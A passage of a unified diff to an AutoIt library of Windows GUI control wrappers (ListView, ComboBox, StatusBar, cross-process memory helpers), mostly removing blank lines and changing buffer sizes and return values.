 	If _LvHasCheckStyle($nCtrl) Then
-		Local $count = 0
+		Local $aCheckedIndices[1] = [0]
 		For $x = 0 To _GUICtrlListView_GetItemCount($nCtrl) - 1
-			If _GUICtrlListView_GetItemChecked($nCtrl, $x) Then $count += 1
+			If _GUICtrlListView_GetItemChecked($nCtrl, $x) Then
+				$aCheckedIndices[0] += 1
+				ReDim $aCheckedIndices[$aCheckedIndices[0] + 1]
+				$aCheckedIndices[$aCheckedIndices[0]] = $x
+			EndIf
 		Next
-		Return $count
+		Return $aCheckedIndices
 	EndIf
 	Return 0
 EndFunc   ;==>_LvGetCheckedCount
-
 ;===============================================================================
 ; Function Name	:	_GetComboInfo
 ; Description		:
 ; Parameter(s)		:	$nCtrl		ComboBox control to get info for
 ;							$type		 	0= return edit hwnd, 1=  return list hwnd
-;
 ; Requirement(s)	:
 ; Return Value(s)	:	return either the combos edit or list hwnd, or zero otherwise
 ; User CallTip		:
@@ -1409,7 +1465,6 @@ Func _InvalidateRect($hwnd)
 	Local $v_ret = DllCall("user32.dll", "int", "InvalidateRect", "hwnd", $hwnd, "ptr", 0, "int", 1)
 	Return $v_ret[0]
 EndFunc   ;==>_InvalidateRect
-
 Func _UpdateWindow($hwnd)
 	Local $v_ret = DllCall("user32.dll", "int", "UpdateWindow", "hwnd", $hwnd)
 	Return $v_ret[0]
@@ -1429,11 +1484,9 @@ EndFunc   ;==>ClientToScreen
 Func _HiWord($x)
 	Return BitShift($x, 16)
 EndFunc   ;==>_HiWord
-
 Func _LoWord($x)
 	Return BitAND($x, 0xFFFF)
 EndFunc   ;==>_LoWord
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_GetColumnCount
 ; Description ...: Retrieve the number of columns
@@ -1449,11 +1502,9 @@ EndFunc   ;==>_LoWord
 ; ===============================================================================================================================
 Func _GUICtrlListView_GetColumnCount($hwnd)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 ;~ 	Local Const $HDM_GETITEMCOUNT = 0x1200
 	Return _SendMessage(_GUICtrlListView_GetHeader($hwnd), 0x1200)
 EndFunc   ;==>_GUICtrlListView_GetColumnCount
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_SetItemChecked
 ; Description ...: Sets the checked state
@@ -1474,11 +1525,8 @@ EndFunc   ;==>_GUICtrlListView_GetColumnCount
 ; ===============================================================================================================================
 Func _GUICtrlListView_SetItemChecked($hwnd, $iIndex, $fCheck = True)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 	Local $fUnicode = _GUICtrlListView_GetUnicodeFormat($hwnd)
-
 	Local $pMemory, $tMemMap, $iRet
-
 	Local $tItem = DllStructCreate($tagLVITEM)
 	Local $pItem = DllStructGetPtr($tItem)
 	Local $iItem = DllStructGetSize($tItem)
@@ -1549,7 +1597,6 @@ Func _GUICtrlListView_SetItemChecked($hwnd, $iIndex, $fCheck = True)
 	EndIf
 	Return False
 EndFunc   ;==>_GUICtrlListView_SetItemChecked
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_SetItemText
 ; Description ...: Changes the text of an item or subitem
@@ -1569,11 +1616,8 @@ EndFunc   ;==>_GUICtrlListView_SetItemChecked
 ; ===============================================================================================================================
 Func _GUICtrlListView_SetItemText($hwnd, $iIndex, $sText, $iSubItem = 0)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 	Local $fUnicode = _GUICtrlListView_GetUnicodeFormat($hwnd)
-
 	Local $iRet
-
 	If $iSubItem = -1 Then
 		Local $SeparatorChar = Opt('GUIDataSeparatorChar')
 		Local $i_cols = _GUICtrlListView_GetColumnCount($hwnd)
@@ -1585,8 +1629,8 @@ Func _GUICtrlListView_SetItemText($hwnd, $iIndex, $sText, $iSubItem = 0)
 		Next
 		Return $iRet
 	EndIf
-
 	Local $iBuffer = StringLen($sText) + 1
+	If $lenth < $iBuffer Then $lenth = $iBuffer
 	Local $tBuffer
 	If $fUnicode Then
 		$tBuffer = DllStructCreate("wchar Text[" & $iBuffer & "]")
@@ -1630,7 +1674,6 @@ Func _GUICtrlListView_SetItemText($hwnd, $iIndex, $sText, $iSubItem = 0)
 	EndIf
 	Return $iRet <> 0
 EndFunc   ;==>_GUICtrlListView_SetItemText
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_GetItemCount
 ; Description ...: Retrieves the number of items in a list-view control
@@ -1646,14 +1689,12 @@ EndFunc   ;==>_GUICtrlListView_SetItemText
 ; ===============================================================================================================================
 Func _GUICtrlListView_GetItemCount($hwnd)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 	If IsHWnd($hwnd) Then
 		Return _SendMessage($hwnd, 0x1000 + 4) ; $LVM_GETITEMCOUNT = ($LVM_FIRST + 4)
 	Else
 		Return GUICtrlSendMsg($hwnd, 0x1000 + 4, 0, 0) ; $LVM_GETITEMCOUNT = ($LVM_FIRST + 4)
 	EndIf
 EndFunc   ;==>_GUICtrlListView_GetItemCount
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_GetItemChecked
 ; Description ...: Returns the check state for a list-view control item
@@ -1663,7 +1704,7 @@ EndFunc   ;==>_GUICtrlListView_GetItemCount
 ; Return values .: Success      - True
 ;                  Failure      - False
 ; Author ........: Anonymous
-; Modified.......: Siao for external control
+; Modified.......: Anonymous for external control
 ; Remarks .......:
 ; Related .......: _GUICtrlListView_SetItemChecked
 ; Link ..........:
@@ -1671,9 +1712,7 @@ EndFunc   ;==>_GUICtrlListView_GetItemCount
 ; ===============================================================================================================================
 Func _GUICtrlListView_GetItemChecked($hwnd, $iIndex)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 	Local $fUnicode = _GUICtrlListView_GetUnicodeFormat($hwnd)
-
 	Local $tLVITEM = DllStructCreate($tagLVITEM)
 	Local $iSize = DllStructGetSize($tLVITEM)
 	Local $pItem = DllStructGetPtr($tLVITEM)
@@ -1681,7 +1720,6 @@ Func _GUICtrlListView_GetItemChecked($hwnd, $iIndex)
 	DllStructSetData($tLVITEM, "Mask", 0x00000008) ; $LVIF_STATE = 0x00000008
 	DllStructSetData($tLVITEM, "Item", $iIndex)
 	DllStructSetData($tLVITEM, "StateMask", 0xffff)
-
 	Local $iRet
 	If IsHWnd($hwnd) Then
 		If _WinAPI_InProcess($hwnd, $_lv_ghLastWnd) Then
@@ -1705,11 +1743,9 @@ Func _GUICtrlListView_GetItemChecked($hwnd, $iIndex)
 			$iRet = GUICtrlSendMsg($hwnd, 0x1000 + 5, 0, $pItem) <> 0 ; $LVM_GETITEMA = ($LVM_FIRST + 5)
 		EndIf
 	EndIf
-
 	If Not $iRet Then Return SetError(-1, -1, False) ; $LV_ERR = -1
 	Return BitAND(DllStructGetData($tLVITEM, "State"), 0x2000) <> 0
 EndFunc   ;==>_GUICtrlListView_GetItemChecked
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_GetItemText
 ; Description ...: Retrieves the text of an item or subitem
@@ -1726,22 +1762,21 @@ EndFunc   ;==>_GUICtrlListView_GetItemChecked
 ; Link ..........:
 ; Example .......: Yes
 ; ===============================================================================================================================
-Func _GUICtrlListView_GetItemText($hwnd, $iIndex, $iSubItem = 0)
+Func _GUICtrlListView_GetItemText($hwnd, $iIndex, $iSubItem = 0, $iBuffer = 999999)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 	Local $fUnicode = _GUICtrlListView_GetUnicodeFormat($hwnd)
-
 	Local $tBuffer
 	If $fUnicode Then
-		$tBuffer = DllStructCreate("wchar Text[4096]")
+		$tBuffer = DllStructCreate("wchar Text[" & $iBuffer & "]")
+		$iBuffer *= 2
 	Else
-		$tBuffer = DllStructCreate("char Text[4096]")
+		$tBuffer = DllStructCreate("char Text[" & $iBuffer & "]")
 	EndIf
 	Local $pBuffer = DllStructGetPtr($tBuffer)
 	Local $tItem = DllStructCreate($tagLVITEM)
 	Local $pItem = DllStructGetPtr($tItem)
 	DllStructSetData($tItem, "SubItem", $iSubItem)
-	DllStructSetData($tItem, "TextMax", 4096)
+	DllStructSetData($tItem, "TextMax", $iBuffer)
 	If IsHWnd($hwnd) Then
 		If _WinAPI_InProcess($hwnd, $_lv_ghLastWnd) Then
 			DllStructSetData($tItem, "Text", $pBuffer)
@@ -1749,7 +1784,7 @@ Func _GUICtrlListView_GetItemText($hwnd, $iIndex, $iSubItem = 0)
 		Else
 			Local $iItem = DllStructGetSize($tItem)
 			Local $tMemMap
-			Local $pMemory = _MemInit($hwnd, $iItem + 4096, $tMemMap)
+			Local $pMemory = _MemInit($hwnd, $iItem + $iBuffer, $tMemMap)
 			Local $pText = $pMemory + $iItem
 			DllStructSetData($tItem, "Text", $pText)
 			_MemWrite($tMemMap, $pItem, $pMemory, $iItem)
@@ -1758,7 +1793,7 @@ Func _GUICtrlListView_GetItemText($hwnd, $iIndex, $iSubItem = 0)
 			Else
 				_SendMessage($hwnd, 0x1000 + 45, $iIndex, $pMemory, 0, "wparam", "ptr") ; $LVM_GETITEMTEXTA = ($LVM_FIRST + 45)
 			EndIf
-			_MemRead($tMemMap, $pText, $pBuffer, 4096)
+			_MemRead($tMemMap, $pText, $pBuffer, $iBuffer)
 			_MemFree($tMemMap)
 		EndIf
 	Else
@@ -1771,7 +1806,6 @@ Func _GUICtrlListView_GetItemText($hwnd, $iIndex, $iSubItem = 0)
 	EndIf
 	Return DllStructGetData($tBuffer, "Text")
 EndFunc   ;==>_GUICtrlListView_GetItemText
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_GetSelectedCount
 ; Description ...: Determines the number of selected items
@@ -1787,14 +1821,12 @@ EndFunc   ;==>_GUICtrlListView_GetItemText
 ; ===============================================================================================================================
 Func _GUICtrlListView_GetSelectedCount($hwnd)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 	If IsHWnd($hwnd) Then
 		Return _SendMessage($hwnd, 0x1000 + 50) ; $LVM_GETSELECTEDCOUNT = ($LVM_FIRST + 50)
 	Else
 		Return GUICtrlSendMsg($hwnd, 0x1000 + 50, 0, 0) ; $LVM_GETSELECTEDCOUNT = ($LVM_FIRST + 50)
 	EndIf
 EndFunc   ;==>_GUICtrlListView_GetSelectedCount
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_DeleteAllItems
 ; Description ...: Removes all items from a list-view control
@@ -1811,7 +1843,6 @@ EndFunc   ;==>_GUICtrlListView_GetSelectedCount
 ; ===============================================================================================================================
 Func _GUICtrlListView_DeleteAllItems($hwnd)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 	If _GUICtrlListView_GetItemCount($hwnd) == 0 Then Return True
 	If IsHWnd($hwnd) Then
 		Return _SendMessage($hwnd, 0x1000 + 9) <> 0 ; $LVM_DELETEALLITEMS = ($LVM_FIRST + 9)
@@ -1825,7 +1856,6 @@ Func _GUICtrlListView_DeleteAllItems($hwnd)
 	EndIf
 	Return False
 EndFunc   ;==>_GUICtrlListView_DeleteAllItems
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_GetSelectedIndices
 ; Description ...: Retrieve indices of selected item(s)
@@ -1855,7 +1885,6 @@ EndFunc   ;==>_GUICtrlListView_DeleteAllItems
 ; ===============================================================================================================================
 Func _GUICtrlListView_GetSelectedIndices($hwnd, $fArray = False)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 	Local $sIndices, $aIndices[1] = [0]
 	Local $iRet, $iCount = _GUICtrlListView_GetItemCount($hwnd)
 	For $iItem = 0 To $iCount
@@ -1884,7 +1913,6 @@ Func _GUICtrlListView_GetSelectedIndices($hwnd, $fArray = False)
 		Return $aIndices
 	EndIf
 EndFunc   ;==>_GUICtrlListView_GetSelectedIndices
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_SetItemSelected
 ; Description ...: Sets whether the item is selected
@@ -1904,7 +1932,6 @@ EndFunc   ;==>_GUICtrlListView_GetSelectedIndices
 ; ===============================================================================================================================
 Func _GUICtrlListView_SetItemSelected($hwnd, $iIndex, $fSelected = True, $fFocused = False)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 	Local $tstruct = DllStructCreate($tagLVITEM)
 	Local $pItem = DllStructGetPtr($tstruct)
 	Local $iRet, $iSelected = 0, $iFocused = 0, $iSize, $tMemMap, $pMemory
@@ -1925,7 +1952,6 @@ Func _GUICtrlListView_SetItemSelected($hwnd, $iIndex, $fSelected = True, $fFocus
 	EndIf
 	Return $iRet <> 0
 EndFunc   ;==>_GUICtrlListView_SetItemSelected
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_DeleteItem
 ; Description ...: Removes an item from a list-view control
@@ -1943,7 +1969,6 @@ EndFunc   ;==>_GUICtrlListView_SetItemSelected
 ; ===============================================================================================================================
 Func _GUICtrlListView_DeleteItem($hwnd, $iIndex)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 	If IsHWnd($hwnd) Then
 		Return _SendMessage($hwnd, 0x1000 + 8, $iIndex) <> 0 ; $LVM_DELETEITEM = ($LVM_FIRST + 8)
 	Else
@@ -1952,7 +1977,6 @@ Func _GUICtrlListView_DeleteItem($hwnd, $iIndex)
 	EndIf
 	Return False
 EndFunc   ;==>_GUICtrlListView_DeleteItem
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_GetColumnWidth
 ; Description ...: Retrieves the width of a column in report or list view
@@ -1971,14 +1995,12 @@ EndFunc   ;==>_GUICtrlListView_DeleteItem
 ; ===============================================================================================================================
 Func _GUICtrlListView_GetColumnWidth($hwnd, $iCol)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 	If IsHWnd($hwnd) Then
 		Return _SendMessage($hwnd, 0x1000 + 29, $iCol) ; $LVM_GETCOLUMNWIDTH = ($LVM_FIRST + 29)
 	Else
 		Return GUICtrlSendMsg($hwnd, 0x1000 + 29, $iCol, 0) ; $LVM_GETCOLUMNWIDTH = ($LVM_FIRST + 29)
 	EndIf
 EndFunc   ;==>_GUICtrlListView_GetColumnWidth
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_Scroll
 ; Description ...: Scrolls the content of a list-view
@@ -2002,14 +2024,12 @@ EndFunc   ;==>_GUICtrlListView_GetColumnWidth
 ; ===============================================================================================================================
 Func _GUICtrlListView_Scroll($hwnd, $iDX, $iDY)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 	If IsHWnd($hwnd) Then
 		Return _SendMessage($hwnd, 0x1000 + 20, $iDX, $iDY) <> 0 ; $LVM_SCROLL = ($LVM_FIRST + 20)
 	Else
 		Return GUICtrlSendMsg($hwnd, 0x1000 + 20, $iDX, $iDY) <> 0 ; $LVM_SCROLL = ($LVM_FIRST + 20)
 	EndIf
 EndFunc   ;==>_GUICtrlListView_Scroll
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_GetExtendedListViewStyle
 ; Description ...: Retrieves the extended styles that are currently in use
@@ -2025,14 +2045,12 @@ EndFunc   ;==>_GUICtrlListView_Scroll
 ; ===============================================================================================================================
 Func _GUICtrlListView_GetExtendedListViewStyle($hwnd)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 	If IsHWnd($hwnd) Then
 		Return _SendMessage($hwnd, 0x1000 + 55) ; $LVM_GETEXTENDEDLISTVIEWSTYLE = ($LVM_FIRST + 55)
 	Else
 		Return GUICtrlSendMsg($hwnd, 0x1000 + 55, 0, 0) ; $LVM_GETEXTENDEDLISTVIEWSTYLE = ($LVM_FIRST + 55)
 	EndIf
 EndFunc   ;==>_GUICtrlListView_GetExtendedListViewStyle
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_GetHeader
 ; Description ...: Retrieves the handle to the header control
@@ -2048,14 +2066,12 @@ EndFunc   ;==>_GUICtrlListView_GetExtendedListViewStyle
 ; ===============================================================================================================================
 Func _GUICtrlListView_GetHeader($hwnd)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 	If IsHWnd($hwnd) Then
 		Return _SendMessage($hwnd, 0x1000 + 31) ; $LVM_GETHEADER = ($LVM_FIRST + 31)
 	Else
 		Return GUICtrlSendMsg($hwnd, 0x1000 + 31, 0, 0) ; LVM_GETHEADER = ($LVM_FIRST + 31)
 	EndIf
 EndFunc   ;==>_GUICtrlListView_GetHeader
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_GetUnicodeFormat
 ; Description ...: Retrieves the UNICODE character format flag
@@ -2072,14 +2088,12 @@ EndFunc   ;==>_GUICtrlListView_GetHeader
 ; ===============================================================================================================================
 Func _GUICtrlListView_GetUnicodeFormat($hwnd)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 	If IsHWnd($hwnd) Then
 		Return _SendMessage($hwnd, 0x2000 + 6) <> 0 ;  $LVM_GETUNICODEFORMAT = 0x2000 + 6
 	Else
 		Return GUICtrlSendMsg($hwnd, 0x2000 + 6, 0, 0) <> 0 ;  $LVM_GETUNICODEFORMAT = 0x2000 + 6
 	EndIf
 EndFunc   ;==>_GUICtrlListView_GetUnicodeFormat
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_GetItemEx
 ; Description ...: Retrieves some or all of an item's attributes
@@ -2097,9 +2111,7 @@ EndFunc   ;==>_GUICtrlListView_GetUnicodeFormat
 ; ===============================================================================================================================
 Func _GUICtrlListView_GetItemEx($hwnd, ByRef $tItem)
 	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"
-
 	Local $fUnicode = _GUICtrlListView_GetUnicodeFormat($hwnd)
-
 	Local $pItem = DllStructGetPtr($tItem)
 	Local $iRet
 	If IsHWnd($hwnd) Then
@@ -2127,7 +2139,6 @@ Func _GUICtrlListView_GetItemEx($hwnd, ByRef $tItem)
 	EndIf
 	Return $iRet <> 0
 EndFunc   ;==>_GUICtrlListView_GetItemEx
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlListView_GetItemParam
 ; Description ...: Retrieves the application specific value of the item
@@ -2149,7 +2160,6 @@ Func _GUICtrlListView_GetItemParam($hwnd, $iIndex)
 	_GUICtrlListView_GetItemEx($hwnd, $tItem)
 	Return DllStructGetData($tItem, "Param")
 EndFunc   ;==>_GUICtrlListView_GetItemParam
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlMenu_TrackPopupMenu
 ; Description ...: Displays a shortcut menu at the specified location
@@ -2188,7 +2198,6 @@ EndFunc   ;==>_GUICtrlListView_GetItemParam
 Func _GUICtrlMenu_TrackPopupMenu($hMenu, $hwnd, $iX = -1, $iY = -1, $iAlignX = 1, $iAlignY = 1, $iNotify = 0, $iButtons = 0)
 	If $iX = -1 Then $iX = _WinAPI_GetMousePosX()
 	If $iY = -1 Then $iY = _WinAPI_GetMousePosY()
-
 	Local $iFlags = 0
 	Switch $iAlignX
 		Case 1
@@ -2218,7 +2227,6 @@ Func _GUICtrlMenu_TrackPopupMenu($hMenu, $hwnd, $iX = -1, $iY = -1, $iAlignX = 1
 	If @error Then Return SetError(@error, @extended, 0)
 	Return $aResult[0]
 EndFunc   ;==>_GUICtrlMenu_TrackPopupMenu
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlComboBox_FindString
 ; Description ...: Search for a string
@@ -2243,10 +2251,8 @@ EndFunc   ;==>_GUICtrlMenu_TrackPopupMenu
 Func _GUICtrlComboBox_FindString($hwnd, $sText, $iIndex = -1)
 	If $Debug_CB Then __UDF_ValidateClassName($hwnd, "ComboBox") ; $__COMBOBOXCONSTANT_ClassName = "ComboBox"
 	If Not IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
-
 	Return _SendMessage($hwnd, 0x14C, $iIndex, $sText, 0, "int", "wstr") ; $CB_FINDSTRING = 0x14C
 EndFunc   ;==>_GUICtrlComboBox_FindString
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlComboBox_AddString
 ; Description ...: Add a string
@@ -2265,10 +2271,8 @@ EndFunc   ;==>_GUICtrlComboBox_FindString
 Func _GUICtrlComboBox_AddString($hwnd, $sText)
 	If $Debug_CB Then __UDF_ValidateClassName($hwnd, "ComboBox") ; $__COMBOBOXCONSTANT_ClassName = "ComboBox"
 	If Not IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
-
 	Return _SendMessage($hwnd, 0x143, 0, $sText, 0, "wparam", "wstr") ; $CB_ADDSTRING = 0x143
 EndFunc   ;==>_GUICtrlComboBox_AddString
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlComboBox_SetCurSel
 ; Description ...: Select a string in the list of a ComboBox
@@ -2290,7 +2294,6 @@ EndFunc   ;==>_GUICtrlComboBox_AddString
 Func _GUICtrlComboBox_SetCurSel($hwnd, $iIndex = -1)
 	If $Debug_CB Then __UDF_ValidateClassName($hwnd, "ComboBox") ; $__COMBOBOXCONSTANT_ClassName = "ComboBox"
 	If Not IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
-
 	Return _SendMessage($hwnd, 0x14E, $iIndex) ;  $CB_SETCURSEL = 0x14E
 EndFunc   ;==>_GUICtrlComboBox_SetCurSel
 ; #FUNCTION# ====================================================================================================================
@@ -2315,18 +2318,14 @@ EndFunc   ;==>_GUICtrlComboBox_SetCurSel
 ; ===============================================================================================================================
 Func _ArrayDelete(ByRef $avArray, $iElement)
 	If Not IsArray($avArray) Then Return SetError(1, 0, 0)
-
 	Local $iUBound = UBound($avArray, 1) - 1
-
 	If Not $iUBound Then
 		$avArray = ""
 		Return 0
 	EndIf
-
 	; Bounds checking
 	If $iElement < 0 Then $iElement = 0
 	If $iElement > $iUBound Then $iElement = $iUBound
-
 	; Move items after $iElement up by 1
 	Switch UBound($avArray, 0)
 		Case 1
@@ -2345,10 +2344,8 @@ Func _ArrayDelete(ByRef $avArray, $iElement)
 		Case Else
 			Return SetError(3, 0, 0)
 	EndSwitch
-
 	Return $iUBound
 EndFunc   ;==>_ArrayDelete
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _SendMessage
 ; Description ...: Wrapper for commonly used Dll Call
@@ -2382,7 +2379,6 @@ Func _SendMessage($hwnd, $iMsg, $wParam = 0, $lParam = 0, $iReturn = 0, $wParamT
 	If $iReturn >= 0 And $iReturn <= 4 Then Return $aResult[$iReturn]
 	Return $aResult
 EndFunc   ;==>_SendMessage
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlStatusBar_Create
 ; Description ...: Create a statusbar
@@ -2413,12 +2409,9 @@ EndFunc   ;==>_SendMessage
 ; ===============================================================================================================================
 Func _GUICtrlStatusBar_Create($hwnd, $vPartEdge = -1, $vPartText = "", $iStyles = -1, $iExStyles = -1)
 	If Not IsHWnd($hwnd) Then Return SetError(1, 0, 0) ; Invalid Window handle for _GUICtrlStatusBar_Create 1st parameter
-
 	Local $iStyle = BitOR(0x40000000, 0x10000000) ; $__UDFGUICONSTANT_WS_CHILD = 0x40000000 $__UDFGUICONSTANT_WS_VISIBLE = 0x10000000
-
 	If $iStyles = -1 Then $iStyles = 0x00000000
 	If $iExStyles = -1 Then $iExStyles = 0x00000000
-
 	Local $aPartWidth[1], $aPartText[1]
 	If @NumParams > 1 Then ; more than param passed in
 		; setting up arrays
@@ -2457,13 +2450,10 @@ Func _GUICtrlStatusBar_Create($hwnd, $vPartEdge = -1, $vPartText = "", $iStyles 
 		If Not IsHWnd($hwnd) Then $hwnd = HWnd($hwnd)
 		If @NumParams > 3 Then $iStyle = BitOR($iStyle, $iStyles)
 	EndIf
-
 	Local $nCtrlID = __UDF_GetNextGlobalID($hwnd)
 	If @error Then Return SetError(@error, @extended, 0)
-
 	Local $hWndSBar = _WinAPI_CreateWindowEx($iExStyles, "msctls_statusbar32", "", $iStyle, 0, 0, 0, 0, $hwnd, $nCtrlID) ; $__STATUSBARCONSTANT_ClassName = "msctls_statusbar32"
 	If @error Then Return SetError(@error, @extended, 0)
-
 	If @NumParams > 1 Then ; set the parts/text
 		_GUICtrlStatusBar_SetParts($hWndSBar, UBound($aPartWidth), $aPartWidth)
 		For $x = 0 To UBound($aPartText) - 1
@@ -2472,7 +2462,6 @@ Func _GUICtrlStatusBar_Create($hwnd, $vPartEdge = -1, $vPartText = "", $iStyles 
 	EndIf
 	Return $hWndSBar
 EndFunc   ;==>_GUICtrlStatusBar_Create
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlStatusBar_SetParts
 ; Description ...: Sets the number of parts and the part edges
@@ -2497,7 +2486,6 @@ EndFunc   ;==>_GUICtrlStatusBar_Create
 ; ===============================================================================================================================
 Func _GUICtrlStatusBar_SetParts($hwnd, $iaParts = -1, $iaPartWidth = 25)
 	If $Debug_SB Then __UDF_ValidateClassName($hwnd, "msctls_statusbar32") ; $__STATUSBARCONSTANT_ClassName = "msctls_statusbar32"
-
 	;== start sizing parts
 	Local $tParts, $iParts = 1
 	If IsArray($iaParts) <> 0 Then ; adding array of parts (contains widths)
@@ -2541,7 +2529,6 @@ Func _GUICtrlStatusBar_SetParts($hwnd, $iaParts = -1, $iaPartWidth = 25)
 	_GUICtrlStatusBar_Resize($hwnd)
 	Return True
 EndFunc   ;==>_GUICtrlStatusBar_SetParts
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlStatusBar_SetText
 ; Description ...: Sets the text in the specified part of a status window
@@ -2566,9 +2553,7 @@ EndFunc   ;==>_GUICtrlStatusBar_SetParts
 ; ===============================================================================================================================
 Func _GUICtrlStatusBar_SetText($hwnd, $sText = "", $iPart = 0, $iUFlag = 0)
 	If $Debug_SB Then __UDF_ValidateClassName($hwnd, "msctls_statusbar32") ; $__STATUSBARCONSTANT_ClassName = "msctls_statusbar32"
-
 	Local $fUnicode = _GUICtrlStatusBar_GetUnicodeFormat($hwnd)
-
 	Local $iBuffer = StringLen($sText) + 1
 	Local $tText
 	If $fUnicode Then
@@ -2596,7 +2581,6 @@ Func _GUICtrlStatusBar_SetText($hwnd, $sText = "", $iPart = 0, $iUFlag = 0)
 	EndIf
 	Return $iRet <> 0
 EndFunc   ;==>_GUICtrlStatusBar_SetText
-
 ; #INTERNAL_USE_ONLY# ===========================================================================================================
 ; Name...........: __UDF_ValidateClassName
 ; Description ...: Used for debugging when creating examples
@@ -2615,11 +2599,9 @@ Func __UDF_ValidateClassName($hwnd, $sClassNames)
 	If _WinAPI_IsClassName($hwnd, $sClassNames) Then Return True
 	Local $sSeparator = Opt("GUIDataSeparatorChar")
 	$sClassNames = StringReplace($sClassNames, $sSeparator, ",")
-
 	__UDF_DebugPrint("Invalid Class Type(s):" & @LF & @TAB & "Expecting Type(s): " & $sClassNames & @LF & @TAB & "Received Type : " & _WinAPI_GetClassName($hwnd))
 	Exit
 EndFunc   ;==>__UDF_ValidateClassName
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _WinAPI_InProcess
 ; Description ...: Determines whether a window belongs to the current process
@@ -2658,7 +2640,6 @@ Func _WinAPI_InProcess($hwnd, ByRef $hLastWnd)
 	$__gaInProcess_WinAPI[$iCount][1] = ($iProcessID = @AutoItPID)
 	Return $__gaInProcess_WinAPI[$iCount][1]
 EndFunc   ;==>_WinAPI_InProcess
-
 ; #INTERNAL_USE_ONLY# ===========================================================================================================
 ; Name...........: _MemInit
 ; Description ...: Initializes a tagMEMMAP structure for a control
@@ -2680,21 +2661,17 @@ Func _MemInit($hwnd, $iSize, ByRef $tMemMap)
 	If @error Then Return SetError(@error, @extended, 0)
 	Local $iProcessID = $aResult[2]
 	If $iProcessID = 0 Then Return SetError(1, 0, 0) ; Invalid window handle
-
 	Local $iAccess = BitOR(0x00000008, 0x00000010, 0x00000020) ; $PROCESS_VM_OPERATION = 0x00000008 $PROCESS_VM_READ = 0x00000010 $PROCESS_VM_WRITE = 0x00000020
-	Local $hProcess = __Mem_OpenProcess($iAccess, False, $iProcessID, True)
+	Local $hProcess = __Mem_OpenProcess($iAccess, True, $iProcessID, True)
 	Local $iAlloc = BitOR(0x00002000, 0x00001000) ; $MEM_RESERVE = 0x00002000 $MEM_COMMIT = 0x00001000
